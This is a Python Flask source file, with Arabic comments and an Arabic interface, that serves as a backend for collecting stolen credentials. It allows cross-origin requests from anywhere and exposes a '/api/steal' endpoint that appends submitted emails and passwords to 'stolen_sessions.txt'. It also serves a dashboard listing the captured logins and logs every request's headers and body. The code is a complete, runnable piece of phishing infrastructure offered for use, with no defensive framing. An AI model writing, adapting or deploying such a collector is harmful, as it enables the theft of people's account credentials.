import os
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}) # نسمح بكل المصادر

DATA_FILE = "stolen_sessions.txt"

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم</title>
    <style>
        body { background-color: #030305; color: #00E5FF; font-family: sans-serif; padding: 20px; }
        h1 { color: #FFD700; text-align: center; }
        .card { background-color: #0E0E14; border: 1px solid #00E5FF; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
        .email { color: #FFD700; }
        .password { color: #FF1744; }
    </style>
</head>
<body>
    <h1>🕵️ لوحة التحكم</h1>
    <div id="data">
        {% for item in data %}
            <div class="card">
                <div class="email">📧 {{ item.email }}</div>
                <div class="password">🔑 {{ item.password }}</div>
            </div>
        {% else %}
            <p>لسا ما في بيانات.</p>
        {% endfor %}
    </div>
</body>
</html>
"""

# 352. نطبع أي طلب بيجي (حتى لو كان OPTIONS أو GET)
@app.before_request
def log_request():
    print(f"--- REQUEST: {request.method} {request.path} from {request.remote_addr} ---")
    print(f"Headers: {dict(request.headers)}")
    if request.data:
        print(f"Body: {request.data}")

@app.route('/api/steal', methods=['POST', 'OPTIONS'])
def steal_data():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.json
    print(f"[+] Received: {data}")
    with open(DATA_FILE, "a") as f:
        f.write(f"{data.get('email')}|{data.get('password')}\n")
    return jsonify({"status": "success"}), 200

@app.route('/')
def dashboard():
    data_list = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            for line in f:
                if "|" in line:
                    email, password = line.strip().split("|")
                    data_list.append({"email": email, "password": password})
    return render_template_string(DASHBOARD_HTML, data=data_list[::-1][:50])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
